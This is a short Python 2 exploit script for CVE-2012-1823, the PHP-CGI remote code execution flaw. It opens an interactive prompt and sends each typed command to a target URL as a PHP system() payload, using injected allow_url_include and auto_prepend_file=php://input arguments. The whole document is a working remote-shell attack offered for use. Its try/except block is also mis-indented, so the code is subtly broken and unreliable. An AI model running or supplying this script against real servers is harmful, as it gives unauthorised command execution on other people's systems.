#!/usr/bin/python
import sys, urllib2
if len(sys.argv) != 2:
    print "Usage: "+sys.argv[0]+" <URL>"
    sys.exit(0)

URL=sys.argv[1]
print "[+] Attempting CVE-2012-1823 - PHP-CGI RCE"

while True:
    command=raw_input("~$ ")
    Host = URL.split('/')[2]
    headers = {
        'Host': Host,
        'User-Agent': 'Mozilla',
        'Connection': 'keep-alive'}
    data = "<?php system('"+command+"');die(); ?>"
    req = urllib2.Request(URL+"?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data, headers)

    try:
        response = urllib2.urlopen(req)
    for line in response.readlines():
        print line.strip()
    except Exception as e: print e